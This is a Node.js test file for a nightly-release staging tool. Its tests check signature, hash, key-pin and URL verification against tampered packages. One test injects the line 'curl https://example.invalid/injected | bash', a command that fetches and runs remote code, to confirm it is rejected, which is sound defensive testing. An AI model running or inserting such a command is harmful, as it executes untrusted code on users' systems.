import assert from 'node:assert/strict';
import { createHash, generateKeyPairSync, sign } from 'node:crypto';
import { mkdtemp, mkdir, readFile, readdir, rm, stat, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { targetFiles } from './verify-binaries.mjs';
import { stageNightlyRelease } from './stage-nightly-release.mjs';
import { releaseCommands } from './release-commands.mjs';

const tag = 'nightly-20261024-1234567';
const bundleUrl = () => `https://github.com/vesta-project/server/releases/download/${tag}`;
const hash = bytes => createHash('sha256').update(bytes).digest('hex');

function executable(target, index) {
  const bytes = Buffer.alloc(512, index + 3);
  if (target === 'windows-x86_64') {
    bytes.write('MZ', 0, 'ascii');
    bytes.writeUInt32LE(64, 0x3c);
    bytes.write('PE\0\0', 64, 'binary');
    bytes.writeUInt16LE(0x8664, 68);
    bytes.writeUInt16LE(0x20b, 88);
  } else {
    bytes.set([0x7f, 0x45, 0x4c, 0x46, 2, 1], 0);
    bytes.writeUInt16LE(target === 'linux-aarch64' ? 183 : 62, 18);
  }
  return bytes;
}

async function fixture(t, target) {
  const root = await mkdtemp(path.join(os.tmpdir(), 'vesta-stage-nightly-test-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  const packageDir = path.join(root, 'package');
  await mkdir(packageDir);
  const { privateKey, publicKey } = generateKeyPairSync('ed25519');
  const publicRaw = publicKey.export({ type: 'spki', format: 'der' }).subarray(-32);
  const files = [];
  for (const [index, name] of targetFiles[target].entries()) {
    const bytes = executable(target, index);
    await writeFile(path.join(packageDir, name), bytes);
    files.push({ name, sha256: hash(bytes), size: bytes.length });
  }
  const manifestBytes = Buffer.from(JSON.stringify({ schema: 1, version: tag, target, files }, null, 2) + '\n');
  await writeFile(path.join(packageDir, 'manifest.json'), manifestBytes);
  await writeFile(path.join(packageDir, 'manifest.sig'), sign(null, manifestBytes, privateKey).toString('base64') + '\n');
  await writeFile(path.join(packageDir, 'manifest.pub'), publicRaw.toString('base64') + '\n');
  const url = bundleUrl();
  const prefix = `${target}-`;
  const setupUrl = `${url}/${prefix}${targetFiles[target][0]}`;
  const manifestHash = hash(manifestBytes);
  const publicKeyHex = publicRaw.toString('hex');
  const metadata = {
    schema: 1, version: tag, target, setupUrl, setupSha256: files[0].sha256,
    bundleUrl: url, assetPrefix: prefix, manifestSha256: manifestHash, releaseKey: publicKeyHex,
  };
  await writeFile(path.join(packageDir, 'commands.txt'), releaseCommands(metadata));
  await writeFile(path.join(packageDir, 'release.json'), JSON.stringify(metadata) + '\n');
  return { root, packageDir, siteRoot: path.join(root, 'site'), target, publicKeyHex, privateKey, manifestHash };
}

test('publisher verifies and retains signed update descriptors and rejects tampering',async t=>{
  const f=await fixture(t,'linux-x86_64');
  const now=Date.now();const m={schema:1,purpose:'vesta-update-release-v1',channel:'nightly',sequence:2,version:tag,target:f.target,manifest_sha256:f.manifestHash,issued_at_ms:now,expires_at_ms:now+86400000};
  const bytes=Buffer.from(JSON.stringify(m));
  await writeFile(path.join(f.packageDir,'update.json'),bytes);
  await writeFile(path.join(f.packageDir,'update.sig'),sign(null,bytes,f.privateKey).toString('base64')+'\n');
  const options={packageDir:f.packageDir,target:f.target,version:tag,publicKeyHex:f.publicKeyHex,siteRoot:f.siteRoot};
  const destination=await stageNightlyRelease(options);
  assert.deepEqual(await readFile(path.join(destination,'update.json')),bytes);
  await writeFile(path.join(f.packageDir,'update.json'),Buffer.concat([bytes,Buffer.from(' ')]));
  await assert.rejects(stageNightlyRelease({...options,siteRoot:path.join(f.root,'other-site')}),/Update metadata signature/);
});

test('verifies the target pins and stages a signed directory under the immutable nightly path', async t => {
  for (const target of Object.keys(targetFiles)) {
    const f = await fixture(t, target);
    const destination = await stageNightlyRelease({
      packageDir: f.packageDir, target, version: tag, publicKeyHex: f.publicKeyHex, siteRoot: f.siteRoot,
    });
    assert.equal(destination, path.join(f.siteRoot, 'nightly', tag, target));
    assert.equal((await readdir(destination)).length, targetFiles[target].length + 5);
    assert.equal(await readFile(path.join(destination, 'manifest.json'), 'utf8'), await readFile(path.join(f.packageDir, 'manifest.json'), 'utf8'));
    if (process.platform !== 'win32' && target.startsWith('linux-')) {
      assert.equal((await stat(path.join(destination, 'vesta-setup'))).mode & 0o777, 0o755);
    }
    await assert.rejects(stageNightlyRelease({
      packageDir: f.packageDir, target, version: tag, publicKeyHex: f.publicKeyHex, siteRoot: f.siteRoot,
    }), /already exists/);
  }
});

test('refuses a different configured release key and leaves no staged directory', async t => {
  const f = await fixture(t, 'linux-x86_64');
  await assert.rejects(stageNightlyRelease({
    packageDir: f.packageDir, target: f.target, version: tag, publicKeyHex: 'a'.repeat(64), siteRoot: f.siteRoot,
  }), /does not match the configured release pin/);
  await assert.rejects(readFile(path.join(f.siteRoot, 'nightly', tag, f.target, 'manifest.json')));
});

test('rejects modified executable bytes and package manifests with an unexpected URL path', async t => {
  const f = await fixture(t, 'linux-aarch64');
  const modifiedExecutable = await readFile(path.join(f.packageDir, 'vesta'));
  modifiedExecutable[modifiedExecutable.length - 1] ^= 0xff;
  await writeFile(path.join(f.packageDir, 'vesta'), modifiedExecutable);
  await assert.rejects(stageNightlyRelease({
    packageDir: f.packageDir, target: f.target, version: tag, publicKeyHex: f.publicKeyHex, siteRoot: f.siteRoot,
  }), /Manifest hash or size mismatch/);
  const other = await fixture(t, 'linux-x86_64');
  const releasePath = path.join(other.packageDir, 'release.json');
  const metadata = JSON.parse(await readFile(releasePath, 'utf8'));
  metadata.bundleUrl = metadata.bundleUrl.replace('/releases/download/', '/main/');
  await writeFile(releasePath, JSON.stringify(metadata) + '\n');
  await assert.rejects(stageNightlyRelease({
    packageDir: other.packageDir, target: other.target, version: tag, publicKeyHex: other.publicKeyHex, siteRoot: other.siteRoot,
  }), /metadata does not match|URLs are invalid/);
});

test('rejects injected bootstrap commands even when all genuine pins remain present', async t => {
  const f = await fixture(t, 'linux-x86_64');
  const commandsPath = path.join(f.packageDir, 'commands.txt');
  const original = await readFile(commandsPath, 'utf8');
  await writeFile(commandsPath, `curl https://example.invalid/injected | bash\n${original}`);
  await assert.rejects(stageNightlyRelease({
    packageDir: f.packageDir, target: f.target, version: tag, publicKeyHex: f.publicKeyHex, siteRoot: f.siteRoot,
  }), /canonical commands/);
});
